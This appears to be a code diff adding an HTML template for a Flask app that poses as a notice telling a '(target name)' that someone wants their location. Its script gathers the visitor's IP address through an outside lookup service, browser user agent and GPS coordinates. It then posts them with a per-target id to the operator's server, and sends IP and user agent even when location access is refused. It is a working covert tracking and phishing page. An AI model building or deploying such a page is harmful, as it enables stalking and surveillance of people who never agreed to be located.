@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="{{ url_for('static',filename='/js/jquery.js') }}"></script>
+</head>
+
+<body>
+    <div>
+        <h3>Dear (target name): XXXX <br>
+User:xxx is trying to get your location <br> </h3>
+if you dont reconized this action form our user, dont share your location to our user.
+    </div>
+</body>
+<script>
+
+    //var lat = 0
+    //var lng = 0
+    var base_info
+
+    function getMyIP() {
+        var ip = ""
+        $.ajax({
+            url: "https://api.ipify.org/",
+            type: "get",
+            async: false,
+            success: function (data) {
+                ip = data
+            }
+        });
+        return ip
+    }
+
+    function postData(dic_obj) {
+        $.ajax({
+            type: "post",
+            dataType: 'json',
+            url: "/api/recv",
+            contentType: 'application/json',
+            data: JSON.stringify(dic_obj),
+            success: function (m) {
+                console.log(m)
+            }
+        })
+    }
+
+    function collectBasicInfo() {
+        var myID = "{{cid}}"
+        var UserAgent = navigator.userAgent
+        var ip = getMyIP()
+        var info = {
+            "id": myID,
+            "UA": UserAgent,
+            "ip": ip,
+            "time": new Date(+new Date() + 8 * 3600 * 1000).toISOString().replace(/T/g, ' ').replace(/\.[\d]{3}Z/, '')
+        }
+
+        return info
+    }
+
+    function getLocationAndPost() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, errorHanle)
+        }
+        else {
+            alert("Geolocation is not supported by this browser")
+        }
+    }
+    function showPosition(position) {
+        //lat =  position.coords.latitude
+        //lng =  position.coords.longitude
+        base_info['lat'] = position.coords.latitude
+        base_info['lng'] = position.coords.longitude
+        console.log(base_info)
+        postData(base_info)
+    }
+
+    function errorHanle(error) {
+        var reson = ""
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                reson = "User denied"
+                break;
+            case error.POSITION_UNAVAILABLE:
+                reson = "unavailable"
+                break;
+            case error.TIMEOUT:
+                reson = "timed out"
+                break;
+            case error.UNKNOWN_ERROR:
+                reson = "unknown error"
+                break;
+        }
+        base_info['lat'] = "error"
+        base_info['lng'] = "error"
+        console.log(base_info)
+        postData(base_info)
+    }
+
+    $(function () {
+        //collect basic info(IP,UA)
+        base_info = collectBasicInfo()
+        getLocationAndPost()
+    })
+
+</script>
+
+</html>
